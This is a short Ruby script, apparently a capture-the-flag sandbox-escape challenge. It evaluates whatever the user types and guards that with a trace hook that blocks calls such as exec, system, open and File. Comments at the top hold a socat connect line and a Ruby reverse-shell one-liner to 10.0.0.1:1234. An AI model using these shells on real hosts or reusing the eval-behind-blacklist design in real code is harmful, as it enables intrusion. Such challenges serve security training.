#!/usr/bin/env ruby

require 'readline'

# socat FILE:$(tty),raw,echo=0 TCP:52.192.198.197:50216
# 
# ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
# 
# IO.popen("date") { |f| puts f.gets }

proc {
  my_exit = Kernel.method(:exit!)
  my_puts = $stdout.method(:puts)

  ObjectSpace.each_object(Module) { |m| m.freeze if m != Readline }

  STDERR.printf "%8s\t%s:%s\t%10s\t%8s\n", "event", "file", "line", "id", "class"

  set_trace_func proc { |event, file, line, id, binding, klass|
    # 
    STDERR.printf "%8s\t%s:%-2d\t%10s\t%8s\n", event, file, line, id, klass
    # 
    bad_id = /`|exec|system|foreach|fork|load|method_added|open|read(?!line$)|require|set_trace_func|spawn|syscall/
    bad_class = /(?<!True|False|Nil)Class|Module|Dir|File|ObjectSpace|Process|Thread/
    
    if event =~ /class/ || (event =~ /call/ && (id =~ bad_id || klass.to_s =~ bad_class))
      my_puts.call "\e[1;31m== Hacker Detected (#{$&}) ==\e[0m"
      my_exit.call
    end
  }
}.call

loop do
  line = Readline.readline('baby> ', true)
  puts '=> ' + eval(line, TOPLEVEL_BINDING).inspect
end

# puts Base64.encode64('123')
# f = File.new("v.php")
# f.each {|line| puts "#{f.lineno}: #{line}" }
